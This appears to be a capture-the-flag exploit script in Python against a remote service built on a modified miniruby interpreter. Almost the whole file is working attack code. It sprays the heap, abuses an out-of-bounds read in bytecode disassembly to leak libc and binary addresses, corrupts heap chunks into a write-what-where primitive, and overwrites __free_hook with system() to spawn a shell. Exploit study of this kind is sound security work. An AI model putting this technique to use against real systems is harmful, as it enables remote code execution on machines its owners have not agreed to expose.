import os
from ast import literal_eval
from subprocess import Popen, PIPE, check_output
from collections import Counter

# from https://github.com/niklasb/ctf-tools
from pwnlib.tools import *

DBG = '--debug' in sys.argv
POW = '--pow' in sys.argv
sys.argv = [a for a in sys.argv if a != '--pow']

os.environ['ASAN_OPTIONS'] = 'detect_leaks=0'

ROOT = os.path.dirname(os.path.abspath(__file__))
ruby = ROOT + '/miniruby'
sys.path.append(ROOT + '/../proof_of_work')
import pow

def rb_dump(code):
    p = Popen([ruby, '-e',
        'STDOUT.write(RubyVM::InstructionSequence::compile(STDIN.read).to_binary)'],
        stdin=PIPE, stdout=PIPE)
    out, err = p.communicate(code)
    assert not err
    return out

def rb_dias(code):
    p = Popen([ruby, '-e',
        'STDOUT.write(RubyVM::InstructionSequence::load_from_binary(STDIN.read).disasm)'],
        stdin=PIPE, stdout=PIPE)
    out, err = p.communicate(code)
    assert not err
    return out

sendbuf = []
def send_cmd(s):
    sendbuf.append(s)

def flush():
    global sendbuf
    C = 500
    for i in range(0, len(sendbuf), C):
        chunk = sendbuf[i:i+C]
        send('\n'.join(chunk))
        send('\n')
        for s in range(len(chunk)):
            ru('> ')
    sendbuf = []

def parse(s):
    res = []
    i = 1
    while i < len(s)-1:
        c = s[i]
        if c != '\\':
            res.append(c)
            i += 1
        else:
            nxt = s[i+1]
            escapes = '\\tbfva"\'nre#'
            sub = "\\\t\b\f\v\a\"'\n\r\x1b#"
            if nxt in escapes:
                res.append(sub[escapes.index(nxt)])
                i += 2
            elif nxt == 'x':
                res.append(chr(int(s[i+2:i+4], 16)))
                i += 4
            else:
                assert False, repr(nxt)
    return ''.join(res)

def write(stridx, idx, c):
    send_cmd('write %d %d %d' % (stridx, idx, c))

def write_str(stridx, s, offset=0):
    for j in range(len(s)-1, -1, -1):
        write(stridx, j+offset, ord(s[j]))

DISAS_STR = 10000000
def leak(sz, alloc_sz=None, payload='X'*0x20):
    global DISAS_STR
    DISAS_STR += 1

    assert len(payload) == 0x20
    payload = '"%s"' % ''.join('\\x%02x' % ord(c) for c in payload)
    dat = rb_dump('b="hellohellohello"\nc=%s' % payload)
    # print len(dat)
    old_sz = pack(15)
    assert dat.count(old_sz) == 1
    dat = dat.replace(old_sz, pack(sz))
    if alloc_sz is not None:
        assert len(dat) <= alloc_sz
        dat = dat.ljust(alloc_sz, '\0')
    write_str(DISAS_STR, dat)
    flush()
    sendln('disas %d' % DISAS_STR)
    ru('"')
    res = '"'
    escaped = False
    while True:
        c = readn(1)
        res += c
        if c == '\\':
            escaped = not escaped
        if c == '"' and not escaped:
            break
        if c != '\\':
            escaped = False
    ru('leave')
    ru('> ')
    # with open('/tmp/test.txt', 'w') as f:
        # f.write(res)
    res = parse(res)
    assert len(res) == sz, '%d == %d' % (len(res), sz)
    return res

def delete(stridx):
    send_cmd('delete %d' % stridx)

def gc():
    send_cmd('gc')

PROGRESS_INTERVAL = 10
TOTAL = 0
def progress(i):
    global TOTAL
    if i % PROGRESS_INTERVAL == 0:
        TOTAL += 1
        sys.stderr.write('\r... Progress: %d' % (TOTAL*PROGRESS_INTERVAL))

connect()
if POW:
    ru('challenge: ')
    chall = ru('\n').strip()
    sol = pow.solve_proof_of_work(chall)
    ru('? ')
    sendln('%d\n' % sol)


ru('> ')

# Leak binary base and the location of a string buffer that we control
def cookie(i):
    return 'AAAA' + p32(i)[:4]

# ~64 MiB heap spray
info('Heap spray...')
HEAP_SPRAY = 1000000
for i in range(1000):
    progress(i)
    write(HEAP_SPRAY + i, 0x10000-2, 0)
for i in range(1000,1100):
    progress(i)
    write(HEAP_SPRAY + i, 799, 0)
for i in range(1100,1200):
    progress(i)
    write(HEAP_SPRAY + i, 399, 0)

HOLE_SPRAY = 100000
for i in range(50):
    progress(i)
    write(HOLE_SPRAY + i, 799, 0)
for i in range(50,100):
    progress(i)
    write(HOLE_SPRAY + i, 399, 0)
flush()

COOKIE_SPRAY = 200000

info('Cookie spray...')
for i in range(2000):
    progress(i)
    write(COOKIE_SPRAY + i, 0x18-2, 0)
    write_str(COOKIE_SPRAY + i, cookie(COOKIE_SPRAY + i))
flush()
info('Done spraying')

for i in range(0, 200, 2):
    progress(i)
    delete(HOLE_SPRAY + i)
gc()
flush()

dat = leak(0x20000, 800)
# raw_input('x')
assert 'AAAA' in dat


binary_addrs = Counter()
payload_cnt = 0
libc_cnt = 0
bin_cnt = 0
libc = 0

for i in range(len(dat)-8):
    x = u64(dat[i:i+8])
    if x & 0xfff == 0x67e:
        binary_addrs[x] += 1
    if (x >> 40) == 0x7f and (u64(dat[i+8:i+16]) >> 40) == 0x7f and not libc:
        # found arena pointer pair
        libc = x - 0x1dd000 - (x&0xfff)
    if dat[i:i+4] == 'AAAA' and dat[i+0x50:i+0x54] == 'AAAA':
        cookie_idx = u32(dat[i+4:i+8])
        cookie_offset = i - 0x10
        cookie2_idx = u32(dat[i+0x54:i+0x58])
        cookie2_offset = i + 0x50 - 0x10
    # if x >= 0x00007ffff78e4000 and x < 0x00007ffff7ac2000 and libc_cnt < 10:
        # libc_cnt += 1
        # print 'libc? ', i, hex(x)
    # if x >= 0x0000555555554000 and x < 0x000055555595f000 and bin_cnt < 10:
        # bin_cnt += 1
        # print 'binary?', i, hex(x)
    # if x >= 0x000055555595f000 and x < 0x00007ffff0000000 and payload_cnt < 30:
        # payload_cnt += 1
        # print 'payload?', i, hex(x)

old_cookie_data = dat[cookie_offset:cookie_offset + 0x200]

loc = u64(dat[1024:1024+8]) - 0x000055a282211b00 + 0x55a2822110b0
cookie_loc = loc + cookie_offset
cookie2_loc = loc + cookie2_offset

# print(hex(binary_addrs.most_common()[0][0]))
base = binary_addrs.most_common()[0][0] - 0x55555589b67e + 0x0000555555554000

info('libc @ %p', libc)
info('base @ %p', base)
info('buffer @ %p', loc)
info('cookie #%d found @ offset 0x%x (addr: %p)', cookie_idx, cookie_offset, cookie_loc)
info('next cookie #%d (addr: %p)', cookie2_idx, cookie2_loc)
write(cookie_idx, 0, 0x42)  # so we can verify in gdb
write(cookie2_idx, 0, 0x43)  # so we can verify in gdb
flush()
# raw_input('x')


rb_vm_insn_op_offset = base + 0x324660
rb_vm_insn_op_info = base + 0x3247f4

# &rb_vm_insn_op_info[rb_vm_insn_op_offset[insn]]
insn = (cookie_loc + 0x10 - rb_vm_insn_op_offset)/2
info('insn = 0x%x', insn)

sample = open('sample.bin').read()
sz_offset = 0x364
code_offset = 0x1e8
ci_size_offset = 0x458

def patch(s, offset, dat):
    return s[:offset] + dat + s[offset+len(dat):]

# in gdb:
# $ set logging on
# $ set logging file /tmp/log.txt
# $ x/2000s rb_vm_insn_op_info    # or more, 10000?
# $ set logging of
#
# in shell:
# $ egrep '"[^HSVKCIGFE]{12,}E[^HSVKCIG]+(F|")' /tmp/peda-znxb7_y2
# 0x55555587cb4f:	"        ret = (TYPE(val) == (int)type) ? Qtrue : Qfalse;\n"
# 0x55555587cdc7:	' ' <repeats 12 times>, "v = vm_exec(ec, TRUE);\n"
# 0x55555587d293:	"        calling.block_handler = vm_caller_setup_arg_block(ec, reg_cfp, ci, blockiseq, TRUE);\n"
# 0x555555880e71:	"| # format: END { [nd_body] }\n"
# 0x555555880e90:	"| # example: END { foo }\n"
# 0x555555881630:	"ZeroDivisionError"

def make_hack(alloc_sz, oob_skip, cc_entries_size, cc_incs, oob=True):
    # offset = p64(0x79f-oob_skip)   # NODE_MODULE\0
                                     #  points   ^   with oob_skip=0
    assert oob_skip <= 12
    offset = p64(0x8e48-oob_skip)    # ZeroDivisionError\0
                                     #  point s    ^   with oob_skip=0
    write_str(cookie_idx, offset)

    assert alloc_sz % 8 == 0

    words = alloc_sz // 8
    assert cc_incs % 2 == 0

    if oob:
        code = ''
        # CECE
        code += (p64(73)+p64(0)*4) * (cc_incs//2)
        # nops
        code += p64(0)*(words-len(code)//8-1)
        # OOB (....E)
        code += p64(insn)
    else:
        code = p64(0)*words
        assert len(code) == alloc_sz

    dat = sample
    dat = patch(dat, sz_offset, p32(words))
    dat = patch(dat, ci_size_offset, p32(cc_entries_size))
    dat = patch(dat, code_offset, code)
    return dat

FREE_STR = 500000
write(FREE_STR, 100, 0)
write_str(FREE_STR, "sh;#")


hax = make_hack(0x68, oob_skip=7, cc_entries_size=2, cc_incs=2, oob=True)
DISAS_STR += 1
write_str(DISAS_STR, hax)

# fake fastbin chunk size
write(cookie_idx, 8, 0x61)
flush()

# fill up GC tcache and make some big holes for GC later
# for i in range(11000, 11040):    write(i, 0x58-2, 0x41)
# for i in range(11000, 11040, 2): delete(i)
# for i in range(12000, 12020):    write(i, 0x68-2, 0x41)
# for i in range(12000, 12020, 2): delete(i)
# for i in range(13000, 13020):    write(i, 0x78-2, 0x41)
# for i in range(13000, 13020, 2): delete(i)
# for i in range(14000, 14007):    write(i, 0xfa8-2, 0x41)
# for i in range(14001, 14007, 2): delete(i)
# make some more holes, to avoid the malloc_consolidate. random shit?
# for i in range(15000, 15007):    write(i, 0x200-2, 0x41)
# for i in range(15001, 15007, 2): delete(i)
gc()
flush()

SMALL_SPRAY = 300000
N = 2500
sizes = [
    0x28,
    0x58, 0x58,
    0x28, 0x38,
    0x28, 0x18, 0x28, 0x48,
    0x28, 0x38, 0x28, 0x88,
    0x28, 0x68, 0x28, 0x58,
    0x28, 0x58, 0x58, 0x28]
cycle = sorted(set(sizes))
for i in range(N):
    t = time.time()
    # progress(i)
    if DBG and i == N-len(sizes):
        flush()
        raw_input('press enter 1 ')
    sz = cycle[i % len(cycle)] if i < N-len(sizes) else sizes[i-(N-len(sizes))]
    write(SMALL_SPRAY + i, sz-2, 0x41)
    # write_str(SMALL_SPRAY + i, p64(cookie_loc + 0x10) + p64(0x133700000000 + (N-i)))
    write_str(SMALL_SPRAY + i, p64(cookie_loc + 0x10))

delete(SMALL_SPRAY + N-20)
delete(SMALL_SPRAY + N-18)
delete(SMALL_SPRAY + N-17)
delete(SMALL_SPRAY + N-15)
delete(SMALL_SPRAY + N-13)
delete(SMALL_SPRAY + N-11)
delete(SMALL_SPRAY + N-9)
delete(SMALL_SPRAY + N-7)
delete(SMALL_SPRAY + N-5)
gc()
delete(SMALL_SPRAY + N-3)
gc()
flush()



# To check if situation is good for exploitation,
# br compile.c:8681
# (1) cc_entries should be followed by a chunk with size 0x60 and first QWORD
#     pointing to the cookie
# (2) code should be followed by a chunk of size 0x30, then one with size 0x60
#     and a fastbin free list pointer

if DBG:
    raw_input('press enter 1.5 ')
send_cmd('disas %d' % DISAS_STR)
flush()
if DBG:
    raw_input('press enter 2')

TRIGGER_SPRAY = 400000

N = 2
for i in range(N):
    if DBG:
        raw_input('x %d' % i)
    write(TRIGGER_SPRAY + i, 0x58-2, 0)
    flush()

if DBG:
    raw_input('x %d (BOOM?)' % N)
master = TRIGGER_SPRAY + N
victim = cookie2_idx

write_str(master, old_cookie_data[0x20:0x20+0x58-2])

offset_victim = 0x30

write_str(master, p64(0x102005), offset=offset_victim)
write_str(master, p64(0x100), offset=offset_victim+0x10)
write_str(master, p32(0x100), offset=offset_victim+0x20)

def www(where, what):
    write_str(master, p64(where), offset=offset_victim+0x18)
    write_str(victim, p64(what))

www(libc + 0x1de8c8, libc + 0x4f370)   # __free_hook = system
flush()
if DBG:
    raw_input('gc?')

# write_str(master, old_cookie_data[0x20:0x20+0x58-2])

delete(FREE_STR)
flush()
sendln('gc')
info('done')


enjoy()
